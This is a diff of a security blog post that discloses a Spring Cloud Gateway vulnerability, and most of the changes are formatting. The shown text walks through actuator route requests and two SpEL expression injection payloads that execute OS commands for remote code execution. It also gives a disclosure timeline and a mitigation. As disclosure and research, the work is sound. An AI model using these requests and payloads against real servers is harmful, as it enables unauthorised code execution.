@@ -9,7 +9,8 @@ categories: jekyll update
 <i> In this blog, we will introduce our new 0-day vulnerability of Spring Cloud Gateway that we had just found out in the first of 2021. This vulnerability was reported to `VMWARE` and they had just been released the patch in the new version which released on 01/03/2021.
 </i>
 
-<b>Note: </b><i>Update in 01/03/2021: 
+<b>Note: </b>
+<i>Update in 01/03/2021: 
 - 16/01/2021: We reported to VMware and being assigned for triage after that. 
 - 16/02/2021: Ask for any update and get my first 0day <b>DUPLICATE</b>
 ![](../0day/duplicate.png)
@@ -37,6 +38,7 @@ There is a list of public endpoint `/actuator` that can help us to construct a r
 
 As the analysis of the above blog, we will summary some promising endpoints:
 1. List all route:
+
 ```
 GET /actuator/gateway/routes HTTP/1.1
 Host: 192.168.137.120:9000
@@ -44,9 +46,11 @@ Connection: close
 
 
 ```
+
 ![List Route](../0day/list-routes.png)
 
 2. Add a route:
+
 ```
 POST /actuator/gateway/routes/test HTTP/1.1
 Host: 192.168.137.120:9000
@@ -76,9 +80,11 @@ Content-Length: 334
   "order": 0
 }
 ```
+
 ![List Route](../0day/new-route.png)
 3. Refresh route:
 After adding a route, all the new route need a subsequent request to make the application recognize.
+
 ```
 GET /actuator/gateway/routes HTTP/1.1
 Host: 192.168.137.120:9000
@@ -86,6 +92,7 @@ Connection: close
 
 
 ```
+
 ![Refresh Route](../0day/refresh.png)
 
 At now, a new route had added and the route can be accessed at `abc` endpoint with the new response header `X-Custom: Test ` which is added by the filter.
@@ -101,6 +108,7 @@ After exploring the Spring Gateway filter through its docs, we were attracted to
 <i> Let see what happen when adding a new route ? </i>
 
 A route after adding with `/actuator` endpoint will be a push to the routing cache. To Publish to the route, a `refresh` request must be made and all the route list arrays in the cache will be popped and converted one by one to a `Route`. We can define the `filter` and `predicate` as this example:
+
 ```
 "filters": [
     {
@@ -111,7 +119,8 @@ A route after adding with `/actuator` endpoint will be a push to the routing cac
       }
     }
   ]
-``` 
+```
+
 ![filter](../0day/filter-definition.png) 
 ![filter](../0day/filter.png) 
 
@@ -124,6 +133,7 @@ Therefore, This code is vulnerable to EL Injection and leads to RCE. There are m
 ```
 #{new java.util.Scanner(''.getClass().forName('java.lang.Runtime').getRuntime().exec('whoami').getInputStream()).useDelimiter('\\A').next().replace('\n',' ')}
 ```
+
 ![filter](../0day/result1.png)
 ![filter](../0day/result2.png)
 
@@ -132,6 +142,7 @@ We had tested above payload on Java 11 but in newer version (java 17), the paylo
 ```
 #{new java.util.Scanner(T(java.lang.Process).getMethod('getInputStream').invoke(T(java.lang.Runtime).getRuntime().exec(new String[]{'ls'}))).useDelimiter('\A').next().replace('\n',' ')}
 ```
+
 # Conclusion:
 To sum up, our research could leverage SSRF to RCE through EL Injection. However, this vulnerability can migrate easily by limiting the access to `/actuator` endpoint. 
 
